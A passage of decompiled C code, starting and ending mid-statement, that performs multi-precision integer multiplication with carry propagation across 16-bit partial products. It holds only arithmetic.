uVar7;\n    if (uVar4 < uVar7) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar7 = *arg_ch * puVar3[2] + uVar4 * 0x10000;\n    iVar5 = iVar5 + (uVar4 >> 0x10);\n    if (uVar7 < uVar4 * 0x10000) {\n        iVar5 = iVar5 + 1;\n    }\n    if (arg_10h + uVar7 < uVar7) {\n        iVar5 = iVar5 + 1;\n    }\n    uVar8 = arg_ch[3] * *puVar3;\n    uVar4 = arg_ch[2] * puVar3[1] + uVar8;\n    iVar6 = arg_ch[3] * puVar3[1];\n    if (uVar4 < uVar8) {\n        iVar6 = iVar6 + 0x10000;\n    }\n    uVar8 = iVar6 + (uVar4 >> 0x10);\n    uVar9 = arg_ch[2] * *puVar3 + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar4 = arg_10h + uVar7 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_ch = iVar5 + uVar8 < uVar8;\n    arg_8h[1] = uVar4;\n    uVar7 = puVar2[5] * *puVar3;\n    uVar4 = puVar2[4] * puVar3[1] + uVar7;\n    iVar6 = puVar2[5] * puVar3[1];\n    if (uVar4 < uVar7) {\n        iVar6 = iVar6 + 0x10000;\n    }\n    uVar7 = iVar6 + (uVar4 >> 0x10);\n    uVar9 = puVar2[4] * *puVar3 + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar7 = uVar7 + 1;\n    }\n    uVar4 = iVar5 + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar7 = uVar7 + 1;\n    }\n    var_4h = arg_ch + uVar7 < uVar7;\n    uVar9 = puVar2[3] * puVar3[2];\n    uVar8 = puVar2[2] * puVar3[3] + uVar9;\n    iVar5 = puVar2[3] * puVar3[3];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[2] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = arg_ch + uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[1] * puVar3[4];\n    uVar8 = *puVar2 * puVar3[5] + uVar9;\n    iVar5 = puVar2[1] * puVar3[5];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = *puVar2 * puVar3[4] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[2] = uVar4;\n    uVar8 = puVar2[1] * puVar3[6];\n    uVar4 = *puVar2 * puVar3[7] + uVar8;\n    iVar5 = puVar2[1] * puVar3[7];\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar4 >> 0x10);\n    uVar9 = *puVar2 * puVar3[6] + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_10h = var_4h + uVar8 < uVar8;\n    uVar9 = puVar2[3] * puVar3[4];\n    uVar4 = puVar2[2] * puVar3[5] + uVar9;\n    iVar5 = puVar2[3] * puVar3[5];\n    if (uVar4 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar4 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[4] + uVar4 * 0x10000;\n    if (uVar10 < uVar4 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = var_4h + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[5] * puVar3[2];\n    uVar8 = puVar2[4] * puVar3[3] + uVar9;\n    iVar5 = puVar2[5] * puVar3[3];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[4] * puVar3[2] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[7] * *puVar3;\n    uVar8 = puVar2[6] * puVar3[1] + uVar9;\n    iVar5 = puVar2[7] * puVar3[1];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[6] * *puVar3 + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    arg_8h[3] = uVar7;\n    uVar8 = puVar2[9] * *puVar3;\n    uVar7 = puVar2[8] * puVar3[1] + uVar8;\n    iVar5 = puVar2[9] * puVar3[1];\n    if (uVar7 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar7 >> 0x10);\n    uVar9 = puVar2[8] * *puVar3 + uVar7 * 0x10000;\n    if (uVar9 < uVar7 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_ch = arg_10h + uVar8 < uVar8;\n    uVar9 = puVar2[7] * puVar3[2];\n    uVar7 = puVar2[6] * puVar3[3] + uVar9;\n    iVar5 = puVar2[7] * puVar3[3];\n    if (uVar7 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar7 >> 0x10);\n    uVar10 = puVar2[6] * puVar3[2] + uVar7 * 0x10000;\n    if (uVar10 < uVar7 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = arg_10h + uVar8 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[5] * puVar3[4];\n    uVar8 = puVar2[4] * puVar3[5] + uVar9;\n    iVar5 = puVar2[5] * puVar3[5];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[4] * puVar3[4] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[3] * puVar3[6];\n    uVar8 = puVar2[2] * puVar3[7] + uVar9;\n    iVar5 = puVar2[3] * puVar3[7];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[6] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[1] * puVar3[8];\n    uVar8 = *puVar2 * puVar3[9] + uVar9;\n    iVar5 = puVar2[1] * puVar3[9];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = *puVar2 * puVar3[8] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[4] = uVar4;\n    uVar8 = puVar2[1] * puVar3[10];\n    uVar4 = *puVar2 * puVar3[0xb] + uVar8;\n    iVar5 = puVar2[1] * puVar3[0xb];\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar4 >> 0x10);\n    uVar9 = *puVar2 * puVar3[10] + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    var_4h = arg_ch + uVar8 < uVar8;\n    uVar9 = puVar2[3] * puVar3[8];\n    uVar4 = puVar2[2] * puVar3[9] + uVar9;\n    iVar5 = puVar2[3] * puVar3[9];\n    if (uVar4 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar4 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[8] + uVar4 * 0x10000;\n    if (uVar10 < uVar4 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = arg_ch + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[5] * puVar3[6];\n    uVar8 = puVar2[4] * puVar3[7] + uVar9;\n    iVar5 = puVar2[5] * puVar3[7];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[4] * puVar3[6] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[7] * puVar3[4];\n    uVar8 = puVar2[6] * puVar3[5] + uVar9;\n    iVar5 = puVar2[7] * puVar3[5];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[6] * puVar3[4] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[9] * puVar3[2];\n    uVar8 = puVar2[8] * puVar3[3] + uVar9;\n    iVar5 = puVar2[9] * puVar3[3];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[8] * puVar3[2] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[0xb] * *puVar3;\n    uVar8 = puVar2[10] * puVar3[1] + uVar9;\n    iVar5 = puVar2[0xb] * puVar3[1];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[10] * *puVar3 + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[5] = uVar7;\n    uVar8 = puVar2[0xd] * *puVar3;\n    uVar7 = puVar2[0xc] * puVar3[1] + uVar8;\n    iVar5 = puVar2[0xd] * puVar3[1];\n    if (uVar7 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar7 >> 0x10);\n    uVar9 = puVar2[0xc] * *puVar3 + uVar7 * 0x10000;\n    if (uVar9 < uVar7 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_10h = var_4h + uVar8 < uVar8;\n    uVar9 = puVar2[0xb] * puVar3[2];\n    uVar7 = puVar2[10] * puVar3[3] + uVar9;\n    iVar5 = puVar2[0xb] * puVar3[3];\n    if (uVar7 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar7 >> 0x10);\n    uVar10 = puVar2[10] * puVar3[2] + uVar7 * 0x10000;\n    if (uVar10 < uVar7 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = var_4h + uVar8 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[9] * puVar3[4];\n    uVar8 = puVar2[8] * puVar3[5] + uVar9;\n    iVar5 = puVar2[9] * puVar3[5];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[8] * puVar3[4] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[7] * puVar3[6];\n    uVar8 = puVar2[6] * puVar3[7] + uVar9;\n    iVar5 = puVar2[7] * puVar3[7];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[6] * puVar3[6] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[5] * puVar3[8];\n    uVar8 = puVar2[4] * puVar3[9] + uVar9;\n    iVar5 = puVar2[5] * puVar3[9];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[4] * puVar3[8] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[3] * puVar3[10];\n    uVar8 = puVar2[2] * puVar3[0xb] + uVar9;\n    iVar5 = puVar2[3] * puVar3[0xb];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[10] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    uVar9 = puVar2[1] * puVar3[0xc];\n    uVar8 = *puVar2 * puVar3[0xd] + uVar9;\n    iVar5 = puVar2[1] * puVar3[0xd];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = *puVar2 * puVar3[0xc] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        arg_10h = arg_10h + 1;\n    }\n    arg_8h[6] = uVar4;\n    uVar8 = puVar2[1] * puVar3[0xe];\n    uVar4 = *puVar2 * puVar3[0xf] + uVar8;\n    iVar5 = puVar2[1] * puVar3[0xf];\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar4 >> 0x10);\n    uVar9 = *puVar2 * puVar3[0xe] + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_ch = arg_10h + uVar8 < uVar8;\n    uVar9 = puVar2[3] * puVar3[0xc];\n    uVar4 = puVar2[2] * puVar3[0xd] + uVar9;\n    iVar5 = puVar2[3] * puVar3[0xd];\n    if (uVar4 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar4 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[0xc] + uVar4 * 0x10000;\n    if (uVar10 < uVar4 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = arg_10h + uVar8 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[5] * puVar3[10];\n    uVar8 = puVar2[4] * puVar3[0xb] + uVar9;\n    iVar5 = puVar2[5] * puVar3[0xb];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[4] * puVar3[10] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[7] * puVar3[8];\n    uVar8 = puVar2[6] * puVar3[9] + uVar9;\n    iVar5 = puVar2[7] * puVar3[9];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[6] * puVar3[8] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[9] * puVar3[6];\n    uVar8 = puVar2[8] * puVar3[7] + uVar9;\n    iVar5 = puVar2[9] * puVar3[7];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[8] * puVar3[6] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[0xb] * puVar3[4];\n    uVar8 = puVar2[10] * puVar3[5] + uVar9;\n    iVar5 = puVar2[0xb] * puVar3[5];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[10] * puVar3[4] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[0xd] * puVar3[2];\n    uVar8 = puVar2[0xc] * puVar3[3] + uVar9;\n    iVar5 = puVar2[0xd] * puVar3[3];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[0xc] * puVar3[2] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar9 = puVar2[0xf] * *puVar3;\n    uVar8 = puVar2[0xe] * puVar3[1] + uVar9;\n    iVar5 = puVar2[0xf] * puVar3[1];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[0xe] * *puVar3 + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar10;\n    if (uVar7 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[7] = uVar7;\n    uVar8 = puVar2[0xf] * puVar3[2];\n    uVar7 = puVar2[0xe] * puVar3[3] + uVar8;\n    iVar5 = puVar2[0xf] * puVar3[3];\n    if (uVar7 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar7 >> 0x10);\n    uVar9 = puVar2[0xe] * puVar3[2] + uVar7 * 0x10000;\n    if (uVar9 < uVar7 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar4 = uVar4 + uVar9;\n    if (uVar4 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    var_4h = arg_ch + uVar8 < uVar8;\n    uVar9 = puVar2[0xd] * puVar3[4];\n    uVar7 = puVar2[0xc] * puVar3[5] + uVar9;\n    iVar5 = puVar2[0xd] * puVar3[5];\n    if (uVar7 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar7 >> 0x10);\n    uVar10 = puVar2[0xc] * puVar3[4] + uVar7 * 0x10000;\n    if (uVar10 < uVar7 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = arg_ch + uVar8 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[0xb] * puVar3[6];\n    uVar8 = puVar2[10] * puVar3[7] + uVar9;\n    iVar5 = puVar2[0xb] * puVar3[7];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[10] * puVar3[6] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[9] * puVar3[8];\n    uVar8 = puVar2[8] * puVar3[9] + uVar9;\n    iVar5 = puVar2[9] * puVar3[9];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[8] * puVar3[8] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[7] * puVar3[10];\n    uVar8 = puVar2[6] * puVar3[0xb] + uVar9;\n    iVar5 = puVar2[7] * puVar3[0xb];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[6] * puVar3[10] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[5] * puVar3[0xc];\n    uVar8 = puVar2[4] * puVar3[0xd] + uVar9;\n    iVar5 = puVar2[5] * puVar3[0xd];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[4] * puVar3[0xc] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    uVar9 = puVar2[3] * puVar3[0xe];\n    uVar8 = puVar2[2] * puVar3[0xf] + uVar9;\n    iVar5 = puVar2[3] * puVar3[0xf];\n    if (uVar8 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar8 >> 0x10);\n    uVar10 = puVar2[2] * puVar3[0xe] + uVar8 * 0x10000;\n    if (uVar10 < uVar8 * 0x10000) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar4 = uVar4 + uVar10;\n    if (uVar4 < uVar10) {\n        uVar9 = uVar9 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[8] = uVar4;\n    uVar8 = puVar2[5] * puVar3[0xe];\n    uVar4 = puVar2[4] * puVar3[0xf] + uVar8;\n    iVar5 = puVar2[5] * puVar3[0xf];\n    if (uVar4 < uVar8) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar8 = iVar5 + (uVar4 >> 0x10);\n    uVar9 = puVar2[4] * puVar3[0xe] + uVar4 * 0x10000;\n    if (uVar9 < uVar4 * 0x10000) {\n        uVar8 = uVar8 + 1;\n    }\n    uVar7 = uVar7 + uVar9;\n    if (uVar7 < uVar9) {\n        uVar8 = uVar8 + 1;\n    }\n    arg_10h = var_4h + uVar8 < uVar8;\n    uVar9 = puVar2[7] * puVar3[0xc];\n    uVar4 = puVar2[6] * puVar3[0xd] + uVar9;\n    iVar5 = puVar2[7] * puVar3[0xd];\n    if (uVar4 < uVar9) {\n        iVar5 = iVar5 + 0x10000;\n    }\n    uVar9 = iVar5 + (uVar4 >> 0x10);\n    uVar10 = puVar2[6] * puVar3[0xc] + 